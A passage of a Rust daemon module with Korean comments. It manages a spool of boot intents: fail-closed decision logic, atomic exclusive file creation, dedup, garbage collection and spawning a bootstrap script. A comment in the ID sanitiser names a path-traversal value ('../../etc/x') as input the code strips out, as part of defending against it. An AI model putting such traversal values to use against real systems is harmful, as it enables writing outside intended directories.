    file_attempts.max(mem_attempts)
}

/// 인텐트 1건의 **순수 판정**. 디스크도 데몬도 보지 않는다 — 그래서 진리표로 전수 시험된다.
///
/// 순서가 곧 우선순위다: 형상 → 미지 토큰 → 만료 → 예산 소진 → 쿨다운 → 실행.
/// (만료를 예산보다 **앞**에 두는 이유: 30분 지난 인텐트는 예산이 남아 있어도 실행 대상이
/// 아니다. 반대로 두면 늙은 인텐트가 예산을 태우며 3번 더 프로세스를 낳는다.)
pub fn decide(it: &BootIntent, attempts: u32, now: f64) -> Disposition {
    // (v3 · 명세 §5) **승격 판독** — 현행(3)과 구 스키마(2)를 모두 받는다. 구 데몬이 남긴
    // 인텐트를 폐기하면 업그레이드 순간에 대기 중이던 오너 선언이 죽는다. 반대 방향(미래
    // 스키마·v1 이하)은 여전히 fail-closed 다 — 모르는 형상을 실행하지 않는다.
    if it.v != INTENT_SCHEMA_V && it.v != INTENT_SCHEMA_V_LEGACY {
        return Disposition::Retire("schema_mismatch");
    }
    // (v3) 이미 닫힌 인텐트는 실행 후보가 아니다 — GC 가 `.done` 을 걷어갈 때까지 남아 있어도
    // 다시 낳지 않는다(종전엔 '파일 존재 = 대기' 라 이 상태가 표현되지 않았다).
    if it.state == IntentState::Terminal {
        return Disposition::Retire("already_terminal");
    }
    let Some(action) = BootAction::parse(&it.action_token) else {
        // ★여기가 '명령 문자열 없음' 계약의 집행 지점이다. 미지 토큰은 실행 후보가 아니라
        //   폐기 대상이다 — 이 분기를 지우면 스풀이 곧 명령 실행 표면이 된다.
        return Disposition::Retire("unknown_action");
    };
    // (P2 · v2) decl_origin 도 닫힌 토큰이다 — 인정 토큰은 hook-human 하나뿐이고 미지값은
    // 실행이 아니라 폐기다. 정상 경로의 유일 writer(boot.enqueue arm)는 미지값을 애초에
    // 거절하므로, 여기 도달하는 미지값은 스풀 직접 투하(§4-10 잔여위험 계급)다 — fail-closed.
    if !it.decl_origin.is_empty()
        && it.decl_origin != DECL_ORIGIN_HOOK_HUMAN
        && it.decl_origin != DECL_ORIGIN_GUI_OPERATOR
    {
        return Disposition::Retire("unknown_decl_origin");
    }
    if now - it.created_at > INTENT_MAX_AGE_SECS {
        return Disposition::Retire("expired");
    }
    if attempts >= MAX_ATTEMPTS {
        return Disposition::Retire("attempts_exhausted");
    }
    if now < it.next_attempt_at {
        return Disposition::Wait {
            until: it.next_attempt_at,
        };
    }
    Disposition::Run(action)
}

/// 실패 후 다음 시도 시각 — **선형 백오프**(쿨다운 × 시도횟수).
pub fn backoff_until(attempts: u32, now: f64) -> f64 {
    now + RETRY_COOLDOWN_SECS * f64::from(attempts.max(1))
}

/// 인텐트 id 정규화. 파일명이 되므로 경로 분리자·상대참조를 **전부** 떨군다
/// (`../../etc/x` 같은 값이 스풀 밖 파일을 만들면 안 된다).
pub fn sanitize_id(raw: &str) -> String {
    let s: String = raw
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
        .take(64)
        .collect();
    if s.is_empty() {
        "intent".to_string()
    } else {
        s
    }
}

/// 감독자가 원장에 남기는 한 줄. **배달이 아니라 기계 유래 표식**이다
/// (`Origin::Boot` 기동 표식과 같은 성격 — delivery.rs `Origin::Supervisor` 문서 참조).
pub fn ledger_line(it: &BootIntent, action: BootAction) -> String {
    format!(
        "[cys-supervisor] boot-intent id={} action={} lane={} reason={}",
        it.id,
        action.as_str(),
        if it.lane.is_empty() { "-" } else { &it.lane },
        if it.reason.is_empty() { "-" } else { &it.reason }
    )
}

// ══════════════════════════════════════════════════════════════════════════════
// 스풀 — 디스크 계층
// ══════════════════════════════════════════════════════════════════════════════

/// 스풀 디렉터리. `state_dir` 하위이므로 **부서 격리를 자동 상속**한다.
pub fn spool_dir(socket_path: &Path) -> PathBuf {
    state_dir(socket_path).join(SPOOL_DIR_NAME)
}

/// 스풀 디렉터리 보장 + unix 권한 **재강제**.
///
/// `create_dir_all` 은 mode 를 **생성 시에만** 적용한다 — 이전 실행이 넓은 권한으로 남긴
/// 디렉터리는 그대로다. 그래서 매번 `set_permissions` 로 조인다(state.rs `write_operator_token`
/// 의 0600 재강제와 같은 규약).
fn ensure_spool(dir: &Path) -> std::io::Result<()> {
    std::fs::create_dir_all(dir)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700))?;
    }
    Ok(())
}

fn intent_path(dir: &Path, id: &str) -> PathBuf {
    dir.join(format!("{id}.json"))
}

/// 인텐트를 스풀에 **원자적으로** 적는다(tmp → rename). unix 는 0600.
fn write_intent(dir: &Path, it: &BootIntent) -> Result<PathBuf, String> {
    ensure_spool(dir).map_err(|e| format!("스풀 생성 실패: {e}"))?;
    let body = serde_json::to_string(&it.to_value()).map_err(|e| format!("직렬화 실패: {e}"))?;
    let final_path = intent_path(dir, &it.id);
    let tmp = dir.join(format!("{}.json.tmp", it.id));
    {
        use std::io::Write;
        #[cfg(unix)]
        let mut f = {
            use std::os::unix::fs::OpenOptionsExt;
            std::fs::OpenOptions::new()
                .write(true)
                .create(true)
                .truncate(true)
                .mode(0o600)
                .open(&tmp)
                .map_err(|e| format!("임시 파일 열기 실패: {e}"))?
        };
        #[cfg(not(unix))]
        let mut f = std::fs::File::create(&tmp).map_err(|e| format!("임시 파일 열기 실패: {e}"))?;
        f.write_all(body.as_bytes())
            .map_err(|e| format!("쓰기 실패: {e}"))?;
    }
    std::fs::rename(&tmp, &final_path).map_err(|e| {
        let _ = std::fs::remove_file(&tmp);
        format!("rename 실패: {e}")
    })?;
    Ok(final_path)
}

/// 선언 id 산출(명세 §2-5). **데몬이 계산한다** — 클라이언트는 재료(`session_id`·
/// `prompt_digest`)만 주고 `surface_id`·`lane` 은 데몬이 도출한 값이다.
///
/// 왜 id 를 선언 내용에서 뽑는가: 종전 id 는 `데몬세대-epoch-sid-카운터` 라 **매 호출이 새 id**
/// 였다. 그래서 같은 선언 이벤트가 재전송돼도(훅 재실행·중복 배달) 인텐트가 하나 더 생겼다.
/// 내용 기반 id 는 재전송을 `O_EXCL` 로 접고(dedup), 오너의 **정당한 재선언**은 앞 인텐트가
/// terminal 로 `.done` 이 되어 있으므로 새 파일로 통과한다(시뮬 T1-3).
///
/// 32 자로 자르는 이유: 이 값이 파일명이며 sha256 전문(64)은 Windows 경로 예산을 필요 이상으로
/// 먹는다. hex 32 = 128 비트라 우발 충돌은 실무상 0 이다.
pub fn compute_decl_id(
    lane: &str,
    surface_id: Option<u64>,
    session_id: &str,
    prompt_digest: &str,
) -> String {
    use sha2::{Digest, Sha256};
    let mut h = Sha256::new();
    // 구분자를 넣는 이유: 없으면 ("ab","c") 와 ("a","bc") 가 같은 해시가 된다.
    h.update(lane.as_bytes());
    h.update(b"|");
    h.update(surface_id.map(|s| s.to_string()).unwrap_or_default().as_bytes());
    h.update(b"|");
    h.update(session_id.as_bytes());
    h.update(b"|");
    h.update(prompt_digest.as_bytes());
    format!("{:x}", h.finalize()).chars().take(32).collect()
}

/// [`enqueue`] 요청. 종전 9개 위치 인자는 호출부에서 순서를 틀리기 쉬웠다(같은 타입이 이웃한
/// `reason`/`decl_origin`, `claim_rc`/`claim_at` 자리).
pub struct EnqueueReq<'a> {
    pub decl_id: &'a str,
    pub action: BootAction,
    /// 레인 소켓 경로. **항상 빈 값**이다(수신 데몬 자신의 레인 — R3-P2-6).
    pub lane: &'a str,
    pub surface_id: Option<u64>,
    pub reason: &'a str,
    pub decl_origin: &'a str,
    pub claim_rc: Option<i64>,
    pub claim_at: Option<f64>,
    /// 실행 주체 스냅샷([`EXECUTOR_RUNNER`]·[`EXECUTOR_PYTHON`]).
    pub executor: &'a str,
}

/// [`enqueue`] 의 귀결. 셋 다 **정상**이며 오류가 아니다 — 훅은 이 값을 그대로 고지한다.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum EnqueueOutcome {
    /// 새 인텐트가 원자적으로 등록됐다.
    Enqueued { path: PathBuf },
    /// 같은 `decl_id` 가 이미 있다 = **같은 선언 이벤트의 재전송**. 새 파일 0.
    Dedup { path: PathBuf },
    /// 같은 좌석에 진행 중 인텐트가 있다 — **기록은 하되 실행하지 않는다**(G1: 1 기록·0 실행).
    Superseded { path: PathBuf, by: String },
}

impl EnqueueOutcome {
    /// 와이어 철자(훅 고지·RPC 응답 토큰).
    pub fn as_str(&self) -> &'static str {
        match self {
            EnqueueOutcome::Enqueued { .. } => "enqueued",
            EnqueueOutcome::Dedup { .. } => "dedup",
            EnqueueOutcome::Superseded { .. } => "superseded",
        }
    }
    pub fn path(&self) -> &Path {
        match self {
            EnqueueOutcome::Enqueued { path }
            | EnqueueOutcome::Dedup { path }
            | EnqueueOutcome::Superseded { path, .. } => path,
        }
    }
}

/// 인텐트를 **원자적으로** 새로 만든다(`O_EXCL`). 이미 있으면 `Ok(None)` = dedup.
///
/// 왜 tmp→rename 이 아니라 `create_new` 인가: tmp→rename 은 **덮어쓰기**라 두 연결이 같은
/// decl_id 로 동시에 들어오면 둘 다 성공하고 뒤엣것이 앞엣것의 `attempts` 를 0 으로 되돌린다
/// (시도 상한의 조용한 확장). `create_new` 는 커널이 유일성을 보증한다 — 연결별 tokio task
/// 병행에서도 원자다.
fn insert_intent_exclusive(dir: &Path, it: &BootIntent) -> Result<Option<PathBuf>, String> {
    ensure_spool(dir).map_err(|e| format!("스풀 생성 실패: {e}"))?;
    let body = serde_json::to_string(&it.to_value()).map_err(|e| format!("직렬화 실패: {e}"))?;
    let path = intent_path(dir, &it.id);
    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    match opts.open(&path) {
        Ok(mut f) => {
            use std::io::Write;
            f.write_all(body.as_bytes()).map_err(|e| format!("쓰기 실패: {e}"))?;
            Ok(Some(path))
        }
        Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => Ok(None),
        Err(e) => Err(format!("인텐트 생성 실패: {e}")),
    }
}

/// terminal 기록 + **즉시 `.done` rename**(시뮬 T1-3).
///
/// rename 이 실패해도 terminal 기록 자체는 남는다(파일 **내용**이 진실이고 이름은 GC 편의다).
/// 다만 그 경우 다음 재선언이 dedup 으로 접힐 수 있으므로 오류를 삼키지 않고 돌려준다.
pub fn close_intent(
    dir: &Path,
    it: &BootIntent,
    t: Terminal,
    now: f64,
) -> Result<PathBuf, String> {
    let mut closed = it.clone();
    closed.state = IntentState::Terminal;
    closed.terminal = Some(t);
    write_intent(dir, &closed)?;
    let from = intent_path(dir, &it.id);
    let to = dir.join(format!("{}.{}{}", it.id, now as u64, DONE_SUFFIX));
    std::fs::rename(&from, &to).map_err(|e| format!("done rename 실패: {e}"))?;
    Ok(to)
}

/// 같은 좌석에 **진행 중**(pending|running)인 다른 선언이 있으면 그 id.
///
/// 스풀을 훑는 비용을 감수하는 이유: 이 판정이 곧 G1("실행은 항상 ≤1")이다. 상한은
/// [`MAX_GC_ENTRIES`] 와 같은 계급으로 유계이며 `.done` 은 애초에 후보가 아니다.
fn inflight_other_for_surface(
    dir: &Path,
    surface_id: Option<u64>,
    decl_id: &str,
) -> Option<String> {
    let sid = surface_id?;
    let rd = std::fs::read_dir(dir).ok()?;
    for ent in rd.flatten().take(MAX_GC_ENTRIES) {
        let p = ent.path();
        let name = p.file_name()?.to_string_lossy().into_owned();
        if name.ends_with(DONE_SUFFIX) || !name.ends_with(".json") {
            continue;
        }
        let stem = name.trim_end_matches(".json").to_string();
        if stem == decl_id {
            continue; // 자기 자신은 이 축의 대상이 아니다(그건 dedup 축이다).
        }
        let Ok(body) = std::fs::read_to_string(&p) else { continue };
        // 손상 파일은 여기서 판정하지 않는다 — 감독자가 state_unreadable 로 닫는다.
        let Some(other) = BootIntent::from_str(&stem, &body) else { continue };
        if other.surface_id == Some(sid)
            && matches!(other.state, IntentState::Pending | IntentState::Running)
        {
            return Some(other.id);
        }
    }
    None
}

/// 부트 인텐트를 스풀에 등록한다 — **감독자의 유일한 입력구**.
///
/// 생산자는 `handlers.rs` 의 `boot.enqueue` RPC arm 하나다. 그 arm 이 지키는 계약 —
/// surface_id 커널 도출(GUI 는 `operator_token` 인가)·lane 자기 고정(항상 빈값)·claim
/// 교차검증·감독자 생존 선검사 — 은 arm 쪽 주석이 정본이고, 이 함수는 검증이 끝난 값을 원자
/// 기록하는 디스크 층이다.
pub fn enqueue(socket_path: &Path, req: &EnqueueReq) -> Result<EnqueueOutcome, String> {
    enqueue_in(&spool_dir(socket_path), req, now_epoch())
}

/// [`enqueue`] 의 **경로·시각 주입판**. 테스트가 임시 디렉터리와 가짜 시각으로 구동한다
/// (플랫폼별 `state_dir` 해소에 의존하지 않아 Windows 에서도 같은 코드가 시험된다).
fn enqueue_in(dir: &Path, req: &EnqueueReq, now: f64) -> Result<EnqueueOutcome, String> {
    let id = sanitize_id(req.decl_id);
    let it = BootIntent {
        id: id.clone(),
        v: INTENT_SCHEMA_V,
        action_token: req.action.as_str().to_string(),
        lane: req.lane.to_string(),
        surface_id: req.surface_id,
        created_at: now,
        attempts: 0,
        next_attempt_at: 0.0,
        reason: req.reason.to_string(),
        decl_origin: req.decl_origin.to_string(),
        claim_rc: req.claim_rc,
        claim_at: req.claim_at,
        decl_id: id,
        executor: req.executor.to_string(),
        generation: 0,
        state: IntentState::Pending,
        terminal: None,
    };
    ensure_spool(dir).map_err(|e| format!("스풀 생성 실패: {e}"))?;
    // ★순서 계약: **원자 insert 가 먼저**다. 진행 중 판정을 먼저 하면 그 사이에 다른 연결이
    //   같은 decl_id 를 넣어 두 파일이 생길 수 있다 — 유일성은 커널이 보증하게 두고, 그 다음에
    //   좌석 점유를 판정한다.
    let Some(path) = insert_intent_exclusive(dir, &it)? else {
        return Ok(EnqueueOutcome::Dedup { path: intent_path(dir, &it.id) });
    };
    if let Some(by) = inflight_other_for_surface(dir, req.surface_id, &it.id) {
        // G1: **기록 1 · 실행 0**. 기록조차 안 하면 오너에겐 "선언했는데 아무 흔적도 없다" 가
        // 되고, 실행까지 하면 같은 좌석에 부트가 둘이 된다.
        let closed = close_intent(
            dir,
            &it,
            Terminal::new(
                TerminalKind::Superseded,
                &format!("by:{by}"),
                &format!("진행 중 부트 {by} 가 끝난 뒤 다시 선언하십시오"),
            ),
            now,
        )?;
        return Ok(EnqueueOutcome::Superseded { path: closed, by });
    }
    Ok(EnqueueOutcome::Enqueued { path })
}

/// 스풀 1회 스캔 결과.
struct Scan {
    /// 파싱에 성공한 인텐트(판정 후보 · [`MAX_SCAN_ENTRIES`] 상한).
    intents: Vec<BootIntent>,
    /// 디스크에서 즉시 지울 대상 — (경로, 사유). 파싱 불가·mtime 초과분.
    /// ★판정 상한과 **독립**으로 채워진다([`MAX_GC_ENTRIES`]) — 그러지 않으면 정렬 앞쪽이
    ///   살아있는 인텐트로 차 있는 동안 뒤쪽 쓰레기가 영원히 검사되지 않는다.
    garbage: Vec<(PathBuf, &'static str)>,
    /// 이번 틱에 스풀에 존재한 id **전부**(맵 retain·상한 집행의 기준집합).
    /// ★여기는 자르지 않는다 — 자르면 스풀에 실재하는 인텐트의 예산이 '없는 것' 취급돼
    ///   조용히 회수될 수 있고, 그 방향이 곧 유계 파기다.
    present: std::collections::HashSet<String>,
    /// 다음 틱이 검사를 시작할 위치(회전 커서).
    next_cursor: usize,
}

/// 스풀을 읽는다. **`*.json` 만** 본다 — 로그·tmp 는 인텐트가 아니다.
///
/// 디스크 mtime GC: 파싱 여부와 무관하게 mtime 이 [`INTENT_MAX_AGE_SECS`] 를 넘긴 파일은
/// 폐기 대상이다(본문이 깨져 `created_at` 을 못 읽는 파일도 반드시 사라지게 하는 층).
///
/// ## 두 상한은 **독립 축**이다 (결함 2b 수리)
///
/// 종전은 정렬 직후 `names.truncate(MAX_SCAN_ENTRIES)` 하나로 **판정과 GC 를 함께** 잘랐다.
/// 그러면 정렬 앞쪽 64건이 살아있는(혹은 지워지지 않는) 인텐트로 차 있는 동안 그 뒤의 쓰레기는
/// **영원히** 검사되지 않는다 = 스풀 무한 성장. 그래서:
///   · 한 틱이 **검사**하는 엔트리 수 = [`MAX_GC_ENTRIES`] (틱 길이의 유계)
///   · 그중 **판정 후보로 올리는** 인텐트 수 = [`MAX_SCAN_ENTRIES`] (한 틱이 볼 인텐트의 유계)
/// 검사 예산을 다 쓴 인텐트는 버려지지 않고 **다음 틱**에 온다 — 그 연결을 **회전 커서**가
/// 만든다. 고정 시작점이면 상한 뒤쪽은 상한을 아무리 키워도 기아 상태로 남는다.
fn scan_spool(dir: &Path, now: f64, cursor: usize) -> Scan {
    let mut intents = Vec::new();
    let mut garbage = Vec::new();
    let mut present = std::collections::HashSet::new();
    let Ok(rd) = std::fs::read_dir(dir) else {
        return Scan {
            intents,
            garbage,
            present,
            next_cursor: 0,
        };
    };
    let mut names: Vec<PathBuf> = rd
        .filter_map(|e| e.ok().map(|e| e.path()))
        .filter(|p| p.extension().is_some_and(|x| x == "json"))
        .collect();
    names.sort();
    let stem = |p: &Path| -> String {
        p.file_stem()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_default()
    };
    for p in &names {
        let id = stem(p);
        if !id.is_empty() {
            present.insert(id);
        }
    }
    let total = names.len();
    if total == 0 {
        return Scan {
            intents,
            garbage,
            present,
            next_cursor: 0,
        };
    }
    let start = cursor % total;
    let examined = total.min(MAX_GC_ENTRIES);
    for k in 0..examined {
        let p = &names[(start + k) % total];
        let id = stem(p);
        if id.is_empty() {
            continue;
        }
        // ① 디스크 mtime GC — **metadata 만** 본다. 본문을 못 읽어도 늙은 파일은 사라진다.
        let too_old = std::fs::metadata(p)
            .and_then(|m| m.modified())
            .ok()
            .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
            .map(|d| now - d.as_secs_f64() > INTENT_MAX_AGE_SECS)
            .unwrap_or(false);
        if too_old {
            garbage.push((p.clone(), "mtime_gc"));
            continue;
        }
        // ② 본문 파싱 — 실패는 기본값 채우기가 아니라 폐기다.
        match std::fs::read_to_string(p) {
            Ok(body) => match BootIntent::from_str(&id, &body) {
                // 판정 후보 상한은 **여기서만** 건다 — 위 GC 는 이 상한에 굶지 않는다.
                Some(it) => {
                    if intents.len() < MAX_SCAN_ENTRIES {
                        intents.push(it);
                    }
                }
                None => garbage.push((p.clone(), "unparsable")),
            },
            // 읽기 실패는 **폐기하지 않는다** — 일시적 I/O 오류로 인텐트를 잃으면
            // 부트가 조용히 사라진다(오살보다 오탐이 낫다는 이 저장소의 방향).
            Err(_) => {}
        }
    }
    Scan {
        intents,
        garbage,
        present,
        next_cursor: (start + examined) % total,
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// 실행 — 감독자가 '낳는' 유일한 행위
// ══════════════════════════════════════════════════════════════════════════════

/// (P2 · R3-P2-5) 실행 실패의 **두 계급** — 접는 방향이 서로 다르다.
#[derive(Clone, Debug, PartialEq)]
pub enum RunErr {
    /// 일시 실패(스폰 실패 등) — 백오프 후 **재시도** 대상이다.
    Retry(String),
    /// 전제 붕괴(claim_stale 등) — 재시도가 무의미하므로 인텐트를 **폐기**한다.
    /// 문자열은 폐기 사유(`intent_retired` 이벤트 페이로드로 나간다).
    Retire(&'static str),
}

/// 행위 실행자. 함수 포인터인 것은 테스트가 **스폰 없이** 루프를 구동하기 위해서다
/// (실 프로세스를 낳지 않고 유계성·순서 계약을 전수 시험한다).
type Runner = fn(&Arc<Daemon>, &BootIntent, BootAction) -> Result<String, RunErr>;

/// 스풀 항목 **제거자**. 함수 포인터인 것은 `Runner` 와 같은 이유다 — "삭제가 계속 실패한다"
/// 는 상태를 테스트가 **결정론**으로 만들 수 있어야 한다. 플랫폼 권한 조작(디렉터리 0500·
/// 읽기전용 속성)에 기대면 macOS·Windows·CI 가 서로 다른 것을 시험하게 되고, 그중 하나라도
/// "실은 삭제에 성공" 하면 유계 검체가 조용히 공전한다.
type Remover = fn(&Path) -> bool;

/// 프로덕션 제거자 — 반환값은 "**이제 이 경로에 파일이 없다**" 이다(성공 판정의 정의처).
///
/// ★Windows 가 주 경로다: 생산자(셸·훅 · U-24)가 남긴 파일에 읽기전용 속성이 걸려 있으면
/// `remove_file` 은 영구히 실패한다. `ensure_spool` 의 권한 재강제는 `#[cfg(unix)]` 라
/// Windows 에서 아무 것도 고치지 않으므로, 그 한 겹을 여기서 만든다(속성 1회 해제 후 재시도).
/// unix 에서 파일 삭제 권한은 **디렉터리** 권한이 결정하므로 같은 조작이 의미가 없고,
/// `set_readonly(false)` 는 0600 을 0666 으로 **넓히기** 때문에 unix 에서는 하지 않는다.
/// 다른 프로세스가 연 파일(백신·생산자 셸)은 그래도 실패할 수 있다 — 그 경우의 유계는
/// 음성 캐시가 책임진다.
fn remove_spool_file(p: &Path) -> bool {
    if std::fs::remove_file(p).is_ok() {
        return true;
    }
    #[cfg(windows)]
    {
        if let Ok(md) = std::fs::metadata(p) {
            let mut perm = md.permissions();
            if perm.readonly() {
                #[allow(clippy::permissions_set_readonly_false)]
                perm.set_readonly(false);
                if std::fs::set_permissions(p, perm).is_ok() && std::fs::remove_file(p).is_ok() {
                    return true;
                }
            }
        }
    }
    // 남이 이미 지웠으면 목적은 달성됐다 — 실패로 세면 음성 캐시가 헛돈다.
    !p.exists()
}

/// 인텐트 1건을 실행한다 — **원장 기록이 행위보다 앞이다**.
///
/// ★불변식(delivery.rs ①의 감독자 축): 이 순서가 뒤집히면, 감독자가 낳은 부트 체인이 pane 에
/// 글자를 밀어 넣는 순간에 원장에는 아직 아무 근거가 없다. 그 창에서 임무 게이트는 기계 push 를
/// **오너 임무로 오인**하고 자율 착수 권한을 오발급한다. `record_audited` 호출이 `runner` 호출
/// **앞**에 있어야 한다는 이 사실을 검체(`H-BOOT-SUP-2`)와 단위테스트가 소스 핀으로 못박는다.
fn dispatch_one(
    daemon: &Arc<Daemon>,
    it: &BootIntent,
    action: BootAction,
    runner: Runner,
) -> Result<String, RunErr> {
    crate::delivery::record_audited(
        daemon,
        it.surface_id.unwrap_or(0),
        &ledger_line(it, action),
        crate::delivery::Origin::Supervisor,
        None,
    );
    runner(daemon, it, action)
}

/// (P2 · R3-P2-5) 레지스트리 재실측의 **순수 판정** — "이 surface 가 지금 master 를 쥐고
/// 살아 있는가". 디스패치 직전의 신선한 실측이 판정의 전부이며, 인텐트가 나른 claim 타임스탬프
/// 는 어떤 판정에도 쓰지 않는다(**타임스탬프 이월 금지** — 이월하면 부트의 결박 창 300s 를
/// 감독자 합법 지연(수명 1800s+백오프)이 넘겨 지연 꼬리에서 rc6 이 결정론으로 재발한다).
pub fn master_holds(registry_master: Option<u64>, sid: u64, alive: bool) -> bool {
    registry_master == Some(sid) && alive
}

/// (P2) PATH **선두에 데몬 exe_dir** 를 얹는다 — 부트 체인은 맨이름 `"cys"` 를 상시 호출하는데
/// 데몬 env PATH 에는 앱 디렉터리가 없을 수 있다(macOS launchd 최소 PATH·Windows GUI 기동).
/// 이 주입 없이는 감독자 부트 전량이 첫 `cys` 호출에서 좌초한다 — '맥은 멀쩡한데 Windows 만
/// 깨지는' 전례 계급 그 자체라, **주입 없이 P2 를 켜지 말 것**(2차 성찰 P2-2 고지).
fn path_with_exe_dir_first(exe_dir: &Path, current: Option<std::ffi::OsString>) -> std::ffi::OsString {
    let mut parts: Vec<PathBuf> = vec![exe_dir.to_path_buf()];
    if let Some(cur) = current {
        parts.extend(std::env::split_paths(&cur));
    }
    // join 실패(경로에 분리자 포함 등 — exe_dir 파생값에선 비실재)는 exe_dir 단독으로 접는다:
    // 이 주입의 존재 이유가 'cys 해소 보장'이므로 그 한 조각은 어떤 실패에서도 남긴다.
    std::env::join_paths(parts).unwrap_or_else(|_| exe_dir.as_os_str().to_os_string())
}

/// boot-supervisor.log 의 **경로 규약 단일 소유자**(★R2 note — 사본 금지).
///
/// 스풀의 부모 = 데몬 상태 디렉터리(`state_dir(socket)` — unix 는 소켓의 부모, Windows 는
/// `%LOCALAPPDATA%\cys[\<slug>]`). 소비자가 셋이라(실행자 `run_ensure_team` · `boot.enqueue`
/// 응답 · 훅 frontdoor note) 문자열을 세 벌로 쓰면 반드시 갈린다. frontdoor 경로에서는
/// **부트 출력이 오직 이 파일에만** 가므로(런 로그가 아예 생기지 않는다) 위치를 못 찾는 것이
/// 그대로 '무엇이 잘못됐는지 알 수 없음'이 된다 — 그래서 규약 소유자에게 물어보게 한다.
pub fn supervisor_log_path(socket_path: &Path) -> PathBuf {
    spool_dir(socket_path)
        .parent()
        .map(|d| d.join("boot-supervisor.log"))
        .unwrap_or_else(|| PathBuf::from("boot-supervisor.log"))
}

/// boot-supervisor.log 크기 상한 1겹(회전 1회 — 훅 런별 로그 A16/R3 규율의 데몬면).
/// 단일 append 파일의 무상한 성장을 막는다 — 초과 시 `.1` 로 밀어내고 새로 쓴다.
const LOG_MAX_BYTES: u64 = 4 * 1024 * 1024;
fn rotate_log_if_huge(log: &Path) {
    let too_big = std::fs::metadata(log).map(|m| m.len() > LOG_MAX_BYTES).unwrap_or(false);
    if too_big {
        let rotated = log.with_extension("log.1");
        let _ = std::fs::remove_file(&rotated);
        let _ = std::fs::rename(log, &rotated);
    }
}

/// [`BootAction::EnsureTeam`] 의 프로덕션 실행자 — 부트 체인을 **데몬의 자식으로** 낳는다.
///
/// 여기서 낳은 자식은 훅의 프로세스 그룹 밖에 있다. 그것이 이 단위 전체의 목적이다
/// (`setsid` 가 없는 Windows 에서 훅 절단이 곧 부트 사망이던 경로의 해소).
///
/// ★`kill_on_drop` 을 **걸지 않는다**: 감독자는 아무것도 죽이지 않는다. 자식 핸들은 즉시
/// 드롭되고 tokio 의 고아 수거기가 좀비를 거둔다 — 부트는 자기 속도로 끝까지 간다.
fn run_ensure_team(
    daemon: &Arc<Daemon>,
    it: &BootIntent,
    _action: BootAction,
) -> Result<String, RunErr> {
    // ── (P2 · R3-P2-5) 디스패치 직전 **레지스트리 재실측** — 타임스탬프 이월 금지 ──────────
    // 인텐트의 claim{rc,at} 은 데이터(진단)일 뿐, 판정은 지금 이 순간의 roles 레지스트리다.
    // 참이면 신선한 claim 판정을 env 로 주입하고(레지스트리 소유자의 실측 — CS-3 보고=실측
    // 정합), 거짓이면 스폰하지 않고 Retire("claim_stale") 로 폐기한다 — 좌석이 죽어 master 가
    // 사라진 뒤의 재시도 정지는 **정직한 정지**다(오너 재선언이 재개 신호).
    // 락 규율: roles 락은 단독 획득 후 즉시 해제(중첩 0 — surfaces→roles 순서 규약 무접촉).
    //
    // ★(R4 수정 라운드 · 표면 축소) surface_id **부재 = fail-closed 폐기**. 유일한 정상
    //   생산자(boot.enqueue arm)는 caller_unresolved 거절로 항상 Some(sid)를 보장하므로,
    //   여기 도달하는 None 은 스풀 직접 투하(§4-10 계급)뿐이다. 종전엔 재실측을 통째로
    //   건너뛰고 신원 env 0 으로 스폰돼 rc6(session_error)×MAX_ATTEMPTS 를 태웠다 —
    //   프로덕션 경로 무손실이므로 스폰 전에 접는다(합성 인텐트 검체들은 주입 러너 경유라
    //   이 게이트와 무접촉).
    if it.surface_id.is_none() {
        return Err(RunErr::Retire("no_surface"));
    }
    let mut verified_claim: Option<(u64, Option<String>)> = None;
    if let Some(sid) = it.surface_id {
        let registry_master = { daemon.roles.lock().unwrap().get("master").copied() };
        let surface = daemon.get_surface(sid);
        let alive = surface
            .as_ref()
            .is_some_and(|s| !s.exited.load(Ordering::Relaxed));
        if !master_holds(registry_master, sid, alive) {
            return Err(RunErr::Retire("claim_stale"));
        }
        // (P1×P2 조립점) 살아있는 선언 surface 의 seat 토큰을 자식 env 로 릴레이 — 데몬 자식은
        // 어느 pane 조상 체인에도 닿지 않으므로, 창 밖 재시도의 claim 은 이 토큰이 완결한다.
        // 이 릴레이는 pane PTY env 배달과 같은 계급(데몬→자기 자식 1프로세스)이며 관측·영속
        // 채널(이벤트·로그·topology)에는 싣지 않는다(무영속·무노출 계약 유지).
        let token = surface.and_then(|s| s.seat_token.clone());
        verified_claim = Some((sid, token));
    }
    let script = cys::pack::pack_dir().join("bin").join("javis_bootstrap.py");
    if !script.is_file() {
        return Err(RunErr::Retry(format!("부트 체인 부재: {}", script.display())));
    }
    let exe_dir = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        .unwrap_or_else(|| PathBuf::from("."));
    let python = crate::bundled_python3(&exe_dir).unwrap_or_else(|| "python3".to_string());
    let lane = if it.lane.is_empty() {
        daemon.socket_path.to_string_lossy().into_owned()
    } else {
        it.lane.clone()
    };
    let log = supervisor_log_path(&daemon.socket_path);
    rotate_log_if_huge(&log);
    let mut cmd = tokio::process::Command::new(&python);
    cmd.arg(&script)
        .env(cys::ENV_SOCKET, &lane)
        // ★재귀 기동 차단(치명위험 ①): 이 자식의 `cys` 호출이 소켓 연결에 실패하면
        //   `spawn_detached_daemon` 으로 **라이벌 데몬**을 낳는다. 데몬이 자기 경쟁자를
        //   낳는 재귀는 폭주 경로다(main.rs office-bridge·auto-restore 와 같은 계약).
        .env("CYS_NO_AUTOSTART", "1")
        // SEAL-1: 번들 python 이 `.pyc` 를 쓰면 코드서명 봉인이 깨진다.
        .env(cys::ENV_PY_NO_BYTECODE, cys::PY_NO_BYTECODE_ON)
        // ★(P2 · R3-P2-1/ANCHOR-1 ④) PATH 선두 = 데몬 exe_dir — bare "cys" 해소 보장.
        .env("PATH", path_with_exe_dir_first(&exe_dir, std::env::var_os("PATH")))
        .stdin(std::process::Stdio::null());
    // ── ★(R2 · 2026-08-26) provenance 상속 절단 — **주지 않기로 한 값 = 없는 값** ──────────
